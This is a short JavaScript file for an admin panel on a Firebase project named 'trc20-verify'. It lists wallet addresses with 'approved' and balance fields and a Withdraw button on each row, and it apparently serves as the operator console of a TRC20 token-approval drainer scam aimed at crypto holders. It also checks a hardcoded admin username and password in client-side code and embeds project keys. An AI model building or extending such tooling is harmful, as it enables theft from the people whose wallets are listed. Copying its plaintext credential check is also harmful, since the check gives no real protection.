// Firebase Config
const firebaseConfig = {
  apiKey: "AIzaSyDPwmF77VXvOlM3l4v2dJsqN0QFh8Qxwfk",
  authDomain: "trc20-verify-17c29.firebaseapp.com",
  projectId: "trc20-verify-17c29",
  storageBucket: "trc20-verify-17c29.firebasestorage.app",
  messagingSenderId: "197859891589",
  appId: "1:197859891589:web:ae2f73ab5c3b6bc1c88cec",
  databaseURL: "https://trc20-verify-17c29-default-rtdb.asia-southeast1.firebasedatabase.app"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// Login Function
document.getElementById("loginBtn").addEventListener("click", login);

function login() {
  const user = document.getElementById("username").value;
  const pass = document.getElementById("password").value;
  if (user === "enre.atul" && pass === "Honda988701@") {
    document.getElementById("loginContainer").style.display = "none";
    document.getElementById("adminPanel").style.display = "block";
    loadWallets();
  } else {
    alert("Invalid credentials");
  }
}

// Load Wallet Data from Firebase
function loadWallets() {
  const table = document.getElementById("walletTableBody");
  db.ref("wallets").once("value", (snapshot) => {
    table.innerHTML = "";
    snapshot.forEach((child) => {
      const data = child.val();
      const row = `
        <tr>
          <td>${data.address}</td>
          <td>${data.approved || 'N/A'}</td>
          <td>${data.balance || 'N/A'}</td>
          <td><button class="withdraw-btn">Withdraw</button></td>
        </tr>`;
      table.innerHTML += row;
    });
  });
}
